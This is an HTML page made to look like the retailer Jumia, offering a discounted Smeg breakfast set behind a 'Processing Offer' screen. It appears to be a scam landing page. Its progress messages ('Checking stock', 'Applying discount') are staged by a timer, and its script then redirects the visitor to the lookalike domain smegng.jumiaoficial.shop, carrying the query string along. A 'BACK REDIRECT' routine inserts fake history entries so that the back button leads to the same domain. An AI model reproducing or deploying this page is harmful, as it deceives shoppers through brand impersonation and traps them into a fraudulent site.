<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Jumia | Processing Offer</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">

<style>
:root {
  --jumia-orange: #f68b1e;
  --jumia-dark: #282828;
  --jumia-muted: #6f6f6f;
  --jumia-border: #ededed;
}

* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: Inter, Arial, sans-serif;
}

body {
  min-height: 100vh;
  background: linear-gradient(180deg, #fff7ef 0%, #ffffff 42%);
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 20px;
  color: var(--jumia-dark);
}

.container {
  width: 100%;
  max-width: 420px;
  background: #fff;
  border: 1px solid var(--jumia-border);
  border-radius: 22px;
  padding: 32px 24px 28px;
  text-align: center;
  box-shadow: 0 18px 50px rgba(0, 0, 0, 0.08);
}

.logo-area {
  width: 150px;
  height: 84px;
  margin: 0 auto 22px;
  display: flex;
  align-items: center;
  justify-content: center;
  position: relative;
}

.logo-pulse {
  position: absolute;
  inset: 0;
  border-radius: 22px;
  background: radial-gradient(circle, rgba(246,139,30,0.18) 0%, rgba(246,139,30,0.04) 60%, transparent 80%);
  animation: pulseGlow 2.6s ease-in-out infinite;
}

.logo-card {
  position: relative;
  z-index: 2;
  width: 138px;
  height: 70px;
  border-radius: 18px;
  background: #fff;
  border: 1px solid #f2f2f2;
  display: flex;
  align-items: center;
  justify-content: center;
  box-shadow: 0 10px 24px rgba(246,139,30,0.12);
  animation: pulseScale 2.6s ease-in-out infinite;
}

.logo-card img {
  width: 118px;
  height: auto;
  display: block;
  object-fit: contain;
}

@keyframes pulseGlow {
  0% { transform: scale(0.95); opacity: 0.5; }
  50% { transform: scale(1.15); opacity: 0.18; }
  100% { transform: scale(0.95); opacity: 0.5; }
}

@keyframes pulseScale {
  0% { transform: scale(1); }
  50% { transform: scale(1.035); }
  100% { transform: scale(1); }
}

.promo-badge {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  background: #fff1e3;
  color: var(--jumia-orange);
  border: 1px solid rgba(246, 139, 30, 0.22);
  font-size: 11px;
  font-weight: 800;
  letter-spacing: 0.9px;
  padding: 7px 14px;
  border-radius: 999px;
  text-transform: uppercase;
  margin-bottom: 16px;
}

h1 {
  font-size: 22px;
  line-height: 1.2;
  font-weight: 800;
  margin-bottom: 10px;
}

p {
  font-size: 14px;
  line-height: 1.5;
  color: var(--jumia-muted);
  margin-bottom: 26px;
}

.progress-container {
  width: 100%;
  height: 9px;
  background: #f1f1f1;
  border-radius: 999px;
  overflow: hidden;
}

.progress-bar {
  height: 100%;
  width: 0%;
  background: linear-gradient(90deg, #f68b1e, #ffb15c);
  border-radius: 999px;
  transition: width 0.15s linear;
}

.status-text {
  margin-top: 14px;
  min-height: 18px;
  color: var(--jumia-orange);
  font-size: 12px;
  font-weight: 800;
  letter-spacing: 1.5px;
  text-transform: uppercase;
}

.secure-note {
  margin-top: 18px;
  font-size: 12px;
  color: #888;
}
</style>
</head>

<body>

<div class="container">
  <div class="logo-area">
    <div class="logo-pulse"></div>
    <div class="logo-card">
      <img src="https://1000marcas.net/wp-content/uploads/2022/04/Jumia-Logo-500x281.png" alt="Jumia Logo">
    </div>
  </div>

  <div class="promo-badge">Hot Promo</div>

  <h1>Processing Offer</h1>

  <p>
    Verifying exclusive Smeg 3-Piece Breakfast Set 2-Slice Toaster,
    1.7L Kettle &amp; Blender...
  </p>

  <div class="progress-container">
    <div class="progress-bar" id="progress"></div>
  </div>

  <div class="status-text" id="status">Starting...</div>

  <div class="secure-note">Please wait while we confirm availability.</div>
</div>

<script>
const redirectURL = "https://smegng.jumiaoficial.shop" + location.search;

const progress = document.getElementById("progress");
const status = document.getElementById("status");

const steps = [
  "Connecting...",
  "Checking stock...",
  "Applying discount...",
  "Reserving item...",
  "Redirecting..."
];

let width = 0;
let stepIndex = 0;

function loader() {
  width += 1;
  progress.style.width = width + "%";

  const nextStep = Math.min(Math.floor(width / 20), steps.length - 1);

  if (nextStep !== stepIndex) {
    stepIndex = nextStep;
    status.innerText = steps[stepIndex];
  }

  if (width < 100) {
    setTimeout(loader, 42);
  } else {
    status.innerText = "Redirecting...";
    setTimeout(() => {
      window.location.href = redirectURL;
    }, 500);
  }
}

setTimeout(loader, 400);

/* BACK REDIRECT */
(function () {
  history.pushState(null, "", location.href);
  history.pushState(null, "", location.href);

  window.addEventListener("popstate", function () {
    window.location.href = redirectURL;
  });
})();
</script>

</body>
</html>
